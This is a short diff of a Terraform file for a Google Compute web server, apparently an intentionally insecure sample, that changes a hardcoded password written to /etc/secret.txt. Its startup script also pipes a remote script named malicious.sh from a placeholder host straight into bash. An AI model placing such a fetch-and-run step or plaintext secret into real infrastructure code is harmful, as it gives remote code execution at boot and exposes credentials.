@@ -22,7 +22,7 @@ resource "google_compute_instance" "web_server" {
 
   metadata_startup_script = <<-EOF
     #!/bin/bash
-    echo "Sensitive data: password123456" > /etc/secret.txt
+    echo "Sensitive data: password1" > /etc/secret.txt
     curl http://example.com/malicious.sh | bash
   EOF
 
